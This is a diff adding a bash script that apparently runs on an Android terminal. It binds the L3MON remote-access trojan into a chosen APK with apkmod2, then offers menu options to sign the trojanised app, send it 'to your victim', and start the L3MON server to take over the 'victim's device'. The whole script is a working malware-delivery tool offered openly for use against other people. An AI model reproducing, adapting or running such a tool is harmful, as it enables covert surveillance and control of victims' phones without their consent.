@@ -1,0 +1,115 @@
+#!/bin/bash
+echo
+PWD=$(pwd)
+printf "\e[1;34;40m In order to bind lemon rat in your desired apk file you must have created a lemon rat previously\e[0m\n"
+printf "\e[1;96;40m IF YOU HAVE ALREADY CREATED A LEMON RAT THEN PRESS ENTER TO CONTINUE ELSE PRESS 'y' to start the server of lemon\e[0m__"
+read choice
+if [[ $choice == y ]]
+then
+echo
+printf "\e[1;97;40m SERVER OF LEMON IS STARTING ....\e[0m\n"
+sleep 2
+printf "\e[1;31;107m Login to your lemon server (url:-  http://localhost:22533/ )using any web browser and make your L3MON.apk file then again run this program to continue\e[0m\n"
+lemon
+else
+printf "\e[1;31m Continuing the program .........\e[0m\n"
+fi
+echo
+printf "\e[1;31mEnter your input apk (path/name.apk) ==> \e[0m"
+read inputapk
+printf "\n"
+printf "\e[1;94mProcessing\e[0m"
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m\n"
+sleep 0.3
+printf "\n"
+apkmod2 -i $inputapk
+sleep 2
+cd $HOME/lemon && mv -v L3MON_binded.apk /sdcard
+cd $PWD
+echo
+printf "\e[1;31m If any error occur during binding the rat, you may ask us on telegram (link:- https://t.me/joinchat/sPry-cUszMw2ZWZk )\e[0m\n"
+echo
+printf "\e[1;34m If it is successfully binded then you can choose following options:-\e[0m\n"
+echo
+printf "\e[1;32m>(01). Sign the binded apk file\e[0m\n"
+printf "\e[1;32m>(02). Send the signed + binded apk file to your victim\e[0m\n"
+printf "\e[1;32m>(03). Install the signed + binded apk in your device \e[0m\n"
+printf "\e[1;32m>(04). Remove the binded apk from you decive\e[0m\n"
+printf "\e[1;32m>(05). Remove the signed + binded apk from your device\e[0m\n"
+printf "\e[1;32m>(06). Start the lemon server to get the session \e[0m\n"
+printf "\e[1;32m>>>>>> Run 'quit' to EXIT this program\e[0m\n"
+echo
+while true
+do
+printf "\e[1;36m Enter your option==> \e[0m"
+read uopt
+echo
+if [[ $uopt == 1 ]] || [[ $uopt == 01 ]]
+then
+printf "\e[1;97;40m In order to sign your binded apk file download the apk signer app from playstore (link:- https://play.google.com/store/apps/details?id=com.haibison.apksigner ) and save the signed apk with name 'L3MON_binded.signed.apk' at same place where your unsigned binded apk file was saved!!\e[0m\n"
+echo
+printf "\e[1;31m press enter key after you have signed the apk or run 'quit' to EXIT the program\e[0m__"
+read hung
+if [[ $hung == quit ]]
+then
+exit
+else
+printf "\e[1;97m Continuing .......\e[0m\n"
+fi
+elif [[ $uopt == 2 ]] || [[ $uopt == 02 ]]
+then
+cd $HOME && cd /sdcard
+xdg-open --send L3MON_binded.signed.apk
+cd $PWD
+elif [[ $uopt == 3 ]] || [[ $uopt == 03 ]]
+then
+cd $HOME && cd /sdcard
+xdg-open L3MON_binded.signed.apk
+cd $PWD
+elif [[ $uopt == 4 ]] || [[ $uopt == 04 ]]
+then
+cd $HOME && cd /sdcard
+seek=$(find L3MON_binded.apk)
+if [[ $seek == L3MON_binded.apk ]]
+then
+rm -rf L3MON_binded.apk
+cd $PWD
+printf "\e[1;31m L3MON_binded.apk is removed from your device\e[0m\n"
+else
+printf "\e[1;31m L3MON_binded.apk is either deleted previously or not found!!\e[0m\n"
+fi
+elif [[ $uopt == 5 ]] || [[ $uopt == 05 ]]
+then
+cd $HOME && cd /sdcard
+siik=$(find L3MON_binded.signed.apk)
+if [[ $siik == L3MON_binded.signed.apk ]]
+then
+rm -rf L3MON_binded.signed.apk
+cd $PWD
+printf "\e[1;31m L3MON_binded.signed.apk is removed from your device\e[0m\n"
+else
+printf "\e[1;31m L3MON_binded.signed.apk is either deleted previously or not found!!\e[0m\n"
+fi
+elif [[ $uopt == 6 ]] || [[ $uopt == 06 ]]
+then
+printf "\e[1;97;40m SERVER OF LEMON IS STARTING ....\e[0m\n"
+sleep 2
+printf "\e[1;31;107m NOW login to your lemon server (url:- http://localhost:22533/ )  using any web browser and get the session of victim's device :)\e[0m\n"
+echo
+echo
+lemon
+elif [[ $uopt == quit ]]
+then
+exit
+else
+printf "\e[1;34;43m Please select a valid option!!\e[0m\n"
+fi
+done
